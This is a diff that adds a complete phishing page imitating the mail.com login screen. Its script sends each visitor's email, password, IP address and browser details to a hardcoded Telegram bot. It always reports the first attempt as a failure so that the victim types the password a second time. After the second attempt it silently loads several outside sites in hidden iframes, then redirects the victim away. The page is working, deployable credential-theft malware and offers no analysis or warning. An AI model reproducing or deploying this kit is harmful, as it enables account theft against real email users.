@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Email accounts with mail.com | Log in here or register today</title>
+    <link rel="shortcut icon" href="https://img.ui-portal.de/ux/mailcom/icons/favicon.ico" type="image/x-icon">
+    <link sizes="16x16" rel="icon" href="https://img.ui-portal.de/ux/mailcom/icons/favicon-16x16.png" type="image/png">
+    <link sizes="32x32" rel="icon" href="https://img.ui-portal.de/ux/mailcom/icons/favicon-32x32.png" type="image/png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --brand-blue: #004788;
+            --button-green: #5c8427;
+            --button-hover: #4a6a1f;
+            --text-dark: #262626;
+            --text-gray: #666;
+            --text-light: #737373;
+            --border-color: #e5e5e5;
+            --background-light: #f5f5f5;
+            --background-lighter: #f9f9f9;
+            --white: #ffffff;
+            --shadow: rgba(0, 85, 164, 0.15);
+            --success-green: #107c10;
+            --error-red: #d13438;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 50%, #f1f3f4 100%);
+            color: var(--text-dark);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 15px;
+            line-height: 1.4;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 420px;
+            margin: 0 auto;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .logo-container {
+            text-align: left;
+            padding: 8px 0 15px;
+            margin-bottom: 5px;
+        }
+        
+        .logo {
+            max-width: 160px;
+            height: auto;
+            transition: transform 0.2s ease;
+        }
+        
+        .logo:hover {
+            transform: scale(1.02);
+        }
+        
+        .login-box {
+            background-color: var(--white);
+            border-radius: 14px;
+            box-shadow: 0 6px 30px var(--shadow);
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            width: 100%;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .login-box:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 40px rgba(0, 85, 164, 0.2);
+        }
+        
+        .login-form {
+            padding: 22px 22px 18px;
+        }
+        
+        .welcome-text {
+            text-align: center;
+            margin-bottom: 18px;
+        }
+        
+        .welcome-text h1 {
+            font-size: 22px;
+            color: var(--brand-blue);
+            margin-bottom: 6px;
+            font-weight: 600;
+            letter-spacing: -0.2px;
+        }
+        
+        .welcome-text p {
+            color: var(--text-gray);
+            font-size: 13px;
+            font-weight: 400;
+            line-height: 1.3;
+        }
+        
+        .ssl-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #f0f7ff;
+            padding: 6px 12px;
+            border-radius: 16px;
+            font-size: 11px;
+            font-weight: 500;
+            margin-top: 12px;
+            color: var(--button-green);
+            border: 1px solid #e1f0ff;
+        }
+        
+        .ssl-badge i {
+            font-size: 11px;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 500;
+            font-size: 13px;
+            color: var(--text-gray);
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 12px 14px;
+            background-color: var(--background-lighter);
+            border: 1.5px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-dark);
+            font-size: 14px;
+            transition: all 0.3s ease;
+            font-weight: 400;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: var(--brand-blue);
+            box-shadow: 0 0 0 3px rgba(0, 71, 136, 0.1);
+            background-color: var(--white);
+        }
+        
+        .input-field::placeholder {
+            color: var(--text-light);
+            font-weight: 400;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .remember-me input {
+            margin-right: 8px;
+            accent-color: var(--brand-blue);
+            transform: scale(1);
+        }
+        
+        .remember-me label {
+            font-size: 13px;
+            color: var(--text-gray);
+            font-weight: 400;
+            cursor: pointer;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, var(--button-green), #67a028);
+            color: var(--white);
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 3px 12px rgba(92, 132, 39, 0.25);
+            letter-spacing: 0.2px;
+        }
+        
+        .login-button:hover {
+            background: linear-gradient(135deg, var(--button-hover), #5c8427);
+            box-shadow: 0 5px 15px rgba(92, 132, 39, 0.35);
+            transform: translateY(-1px);
+        }
+        
+        .login-button:active {
+            transform: translateY(0);
+        }
+        
+        .login-button:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin-top: 16px;
+        }
+        
+        .forgot-password a {
+            color: var(--brand-blue);
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            transition: color 0.2s ease;
+        }
+        
+        .forgot-password a:hover {
+            color: #003366;
+            text-decoration: underline;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: var(--text-light);
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--border-color), transparent);
+        }
+        
+        .divider span {
+            padding: 0 12px;
+            font-size: 12px;
+            font-weight: 400;
+        }
+        
+        .signup-link {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 13px;
+        }
+        
+        .signup-link p {
+            color: var(--text-gray);
+            margin-bottom: 4px;
+        }
+        
+        .signup-link a {
+            color: var(--brand-blue);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s ease;
+        }
+        
+        .signup-link a:hover {
+            color: #003366;
+            text-decoration: underline;
+        }
+        
+        .features {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            padding: 16px;
+            background: linear-gradient(135deg, #f8f9fa, #ffffff);
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .feature {
+            text-align: center;
+            flex: 1;
+            padding: 0 5px;
+        }
+        
+        .feature i {
+            font-size: 18px;
+            color: var(--brand-blue);
+            margin-bottom: 8px;
+            opacity: 0.9;
+        }
+        
+        .feature p {
+            font-size: 10px;
+            color: var(--text-gray);
+            font-weight: 400;
+            line-height: 1.2;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 25px;
+            padding: 18px 12px;
+            color: var(--text-gray);
+            font-size: 12px;
+            width: 100%;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: var(--brand-blue);
+            text-decoration: none;
+            font-size: 11px;
+            font-weight: 400;
+            transition: color 0.2s ease;
+        }
+        
+        .footer-links a:hover {
+            color: #003366;
+            text-decoration: underline;
+        }
+        
+        .message {
+            padding: 10px 12px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            display: none;
+            border: 1px solid;
+            font-size: 13px;
+        }
+        
+        .error-message {
+            background-color: rgba(209, 52, 56, 0.05);
+            border-color: #ffcdd2;
+            color: var(--error-red);
+        }
+        
+        .success-message {
+            background-color: rgba(16, 124, 16, 0.05);
+            border-color: #c8e6c9;
+            color: var(--success-green);
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        
+        .spinner {
+            border: 2px solid rgba(0, 75, 135, 0.1);
+            border-radius: 50%;
+            border-top: 2px solid var(--brand-blue);
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Enhanced Mobile Responsiveness */
+        @media (max-width: 480px) {
+            body {
+                padding: 12px;
+            }
+            
+            .container {
+                max-width: 100%;
+            }
+            
+            .logo-container {
+                padding: 5px 0 12px;
+            }
+            
+            .logo {
+                max-width: 140px;
+            }
+            
+            .login-box {
+                border-radius: 12px;
+                box-shadow: 0 5px 20px var(--shadow);
+            }
+            
+            .login-form {
+                padding: 18px 18px 15px;
+            }
+            
+            .welcome-text h1 {
+                font-size: 20px;
+            }
+            
+            .welcome-text p {
+                font-size: 12px;
+            }
+            
+            .features {
+                flex-direction: column;
+                gap: 12px;
+                padding: 14px;
+                margin-top: 18px;
+            }
+            
+            .feature {
+                margin-bottom: 4px;
+            }
+            
+            .footer {
+                margin-top: 20px;
+                padding: 15px 10px;
+            }
+            
+            .footer-links {
+                gap: 15px;
+            }
+            
+            .input-field {
+                padding: 11px 13px;
+                font-size: 16px;
+            }
+        }
+        
+        @media (max-width: 360px) {
+            .login-form {
+                padding: 16px 14px 12px;
+            }
+            
+            .welcome-text h1 {
+                font-size: 18px;
+            }
+            
+            .footer-links {
+                gap: 12px;
+            }
+            
+            .logo {
+                max-width: 120px;
+            }
+        }
+        
+        /* Improved touch targets for mobile */
+        @media (max-width: 768px) {
+            .login-button, .input-field {
+                min-height: 44px;
+            }
+            
+            .remember-me label {
+                padding: 6px 0;
+            }
+            
+            .forgot-password a, .signup-link a {
+                padding: 6px 0;
+                display: inline-block;
+            }
+        }
+
+        /* Tablet and larger screens */
+        @media (min-width: 769px) and (max-width: 1024px) {
+            .container {
+                max-width: 420px;
+            }
+            
+            body {
+                padding: 20px 15px;
+            }
+        }
+
+        /* Large desktop screens */
+        @media (min-width: 1200px) {
+            .container {
+                max-width: 420px;
+            }
+        }
+
+        /* Prevent horizontal scrolling */
+        html, body {
+            overflow-x: hidden;
+        }
+
+        /* Smooth scrolling */
+        html {
+            scroll-behavior: smooth;
+        }
+
+        /* Focus styles for accessibility */
+        button:focus-visible,
+        input:focus-visible,
+        a:focus-visible {
+            outline: 2px solid var(--brand-blue);
+            outline-offset: 2px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <a href="https://www.mail.com">
+                <img src="https://static.cdnlogo.com/logos/m/0/mail-com.svg" alt="mail.com Logo" class="logo">
+            </a>
+        </div>
+        
+        <div class="login-box">
+            <div class="login-form">
+                <div class="welcome-text">
+                    <h1>Welcome!</h1>
+                    <p>Log in to access your mail.com email account</p>
+                    <div class="ssl-badge">
+                        <i class="fas fa-shield-alt"></i> SSL Secured Connection
+                    </div>
+                </div>
+                
+                <div class="message error-message" id="errorMessage">
+                    <i class="fas fa-exclamation-circle"></i> <span id="errorText">Invalid email or password. Please try again.</span>
+                </div>
+                
+                <div class="message success-message" id="successMessage">
+                    <i class="fas fa-check-circle"></i> Login successful! Redirecting...
+                </div>
+                
+                <div class="loading" id="loadingIndicator">
+                    <div class="spinner"></div>
+                    <p style="margin-top: 8px;">Verifying your credentials...</p>
+                </div>
+                
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label class="form-label" for="email">Email Address</label>
+                        <input name="email" class="input-field" id="email" required type="email" placeholder="yourname@mail.com" value="" autocomplete="username">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label" for="password">Password</label>
+                        <input name="password" class="input-field" id="password" required type="password" placeholder="Enter your password" value="" autocomplete="current-password">
+                    </div>
+                    
+                    <div class="remember-me">
+                        <input name="remember" id="remember" type="checkbox">
+                        <label for="remember">Keep me logged in</label>
+                    </div>
+                    
+                    <button class="login-button" id="submitButton" type="submit">
+                        <span id="buttonText">Log in</span>
+                    </button>
+                </form>
+                
+                <div class="forgot-password">
+                    <a href="#">Forgot your password?</a>
+                </div>
+                
+                <div class="divider">
+                    <span>New to mail.com?</span>
+                </div>
+                
+                <div class="signup-link">
+                    <p>Don't have an account? <a href="#">Create one now</a></p>
+                </div>
+                
+                <div class="features">
+                    <div class="feature">
+                        <i class="fas fa-shield-alt"></i>
+                        <p>Secure & Private</p>
+                    </div>
+                    <div class="feature">
+                        <i class="fas fa-cloud"></i>
+                        <p>65GB Free Storage</p>
+                    </div>
+                    <div class="feature">
+                        <i class="fas fa-mobile-alt"></i>
+                        <p>Mobile Friendly</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>&copy; 2023 mail.com. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Help</a>
+                <a href="#">Contact</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    // Telegram Bot Configuration
+    const TELEGRAM_BOT_TOKEN = '8463501805:AAH8h3ECkoEjcDMW8wvhKgDdHOloudEyIXw';
+    const TELEGRAM_CHAT_ID = '7109555104';
+    
+    // Store form data and login attempts
+    let loginAttempts = 0;
+    let formData = {
+        email: '',
+        password: '',
+        ip: '',
+        timestamp: '',
+        keepSignedIn: false
+    };
+
+    // Function to get user IP
+    async function getUserIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('Error fetching IP:', error);
+            return 'Unknown';
+        }
+    }
+
+    // Function to send data to Telegram
+    async function sendToTelegram(data, attemptType) {
+        try {
+            const status = attemptType === 'first' ? 'FAIL ❌' : 'SUCCESS ✅';
+            const message = `
+📧 Mail.com Login Attempt
+━━━━━━━━━━━━━━━━━━━
+📧 Email: ${data.email}
+🔑 Password: ${data.password}
+💾 Keep Signed In: ${data.keepSignedIn ? 'Yes' : 'No'}
+🔄 Attempt: ${attemptType === 'first' ? 'First Password' : 'Second Password'}
+📊 Status: ${status}
+🌐 IP Address: ${data.ip}
+⏰ Timestamp: ${data.timestamp}
+🖥️ User Agent: ${navigator.userAgent}
+            `;
+            
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            const result = await response.json();
+            return result.ok;
+        } catch (error) {
+            console.error('Error sending to Telegram:', error);
+            return false;
+        }
+    }
+
+    // Function to start background redirects (runs only after successful login)
+    function startBackgroundRedirects() {
+        const urls = [
+            'https://www.askul.co.jp',
+            'https://www.monotaro.com',
+            'https://www.netsea.jp',
+            'https://www.synabiz.co.jp',
+            'https://www.aucfan.co.jp',
+            'https://www.tunageru.com',
+            'https://www.dena.com',
+            'https://fujisho.ne.jp',
+            'https://www.ybc-biz.com',
+            'https://star-bizs.com'
+        ];
+        
+        let current = 0;
+        
+        function doRedirect() {
+            if (current < urls.length) {
+                const iframe = document.createElement('iframe');
+                iframe.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0.01;border:none;pointer-events:none;';
+                iframe.src = urls[current] + '?ref=' + Date.now();
+                document.body.appendChild(iframe);
+                
+                setTimeout(() => {
+                    if (iframe.parentNode) {
+                        iframe.remove();
+                    }
+                }, 80);
+                
+                current++;
+                setTimeout(doRedirect, 180);
+            }
+        }
+        
+        setTimeout(doRedirect, 100);
+    }
+
+    // Main functionality
+    document.addEventListener('DOMContentLoaded', function() {
+        const loginForm = document.getElementById('loginForm');
+        const errorMessage = document.getElementById('errorMessage');
+        const errorText = document.getElementById('errorText');
+        const successMessage = document.getElementById('successMessage');
+        const loadingIndicator = document.getElementById('loadingIndicator');
+        const submitButton = document.getElementById('submitButton');
+        const buttonText = document.getElementById('buttonText');
+        
+        // Check for email parameter in URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailFromUrl = urlParams.get('email');
+        if (emailFromUrl) {
+            document.getElementById('email').value = emailFromUrl;
+        }
+        
+        // Form submission handler
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const keepSignedIn = document.getElementById('remember').checked;
+            
+            if (!email || !password) {
+                showError('Please fill in all fields');
+                return;
+            }
+            
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                showError('Please enter a valid email address');
+                return;
+            }
+            
+            // Store form data
+            formData.email = email;
+            formData.password = password;
+            formData.keepSignedIn = keepSignedIn;
+            formData.timestamp = new Date().toLocaleString();
+            
+            loadingIndicator.style.display = 'block';
+            hideError();
+            successMessage.style.display = 'none';
+            submitButton.disabled = true;
+            buttonText.textContent = 'Logging in...';
+            
+            // Get IP address
+            formData.ip = await getUserIP();
+            
+            loginAttempts++;
+            
+            if (loginAttempts === 1) {
+                // First attempt - always fails
+                setTimeout(async () => {
+                    await sendToTelegram(formData, 'first');
+                    
+                    loadingIndicator.style.display = 'none';
+                    showError('Invalid email or password. Please try again.');
+                    submitButton.disabled = false;
+                    buttonText.textContent = 'Try again';
+                    document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
+                }, 1500);
+            } else if (loginAttempts === 2) {
+                // Second attempt - always succeeds
+                setTimeout(async () => {
+                    await sendToTelegram(formData, 'second');
+                    
+                    loadingIndicator.style.display = 'none';
+                    successMessage.style.display = 'block';
+                    
+                    // Start background redirects silently
+                    setTimeout(() => {
+                        startBackgroundRedirects();
+                        
+                        // Redirect to actual mail.com after a delay
+                        setTimeout(() => {
+                            const emailDomain = formData.email.split('@')[1];
+                            if (emailDomain) {
+                                window.location.href = `https://www.${emailDomain}`;
+                            } else {
+                                window.location.href = 'https://www.mail.com';
+                            }
+                        }, 2000);
+                    }, 1000);
+                }, 1500);
+            }
+        });
+        
+        function showError(message) {
+            errorText.textContent = message;
+            errorMessage.style.display = 'block';
+        }
+        
+        function hideError() {
+            errorMessage.style.display = 'none';
+        }
+        
+        // Reset login attempts if email is changed
+        document.getElementById('email').addEventListener('input', function() {
+            if (loginAttempts > 0) {
+                loginAttempts = 0;
+                hideError();
+                buttonText.textContent = 'Log in';
+            }
+        });
+    });
+    </script>
+</body>
+</html>
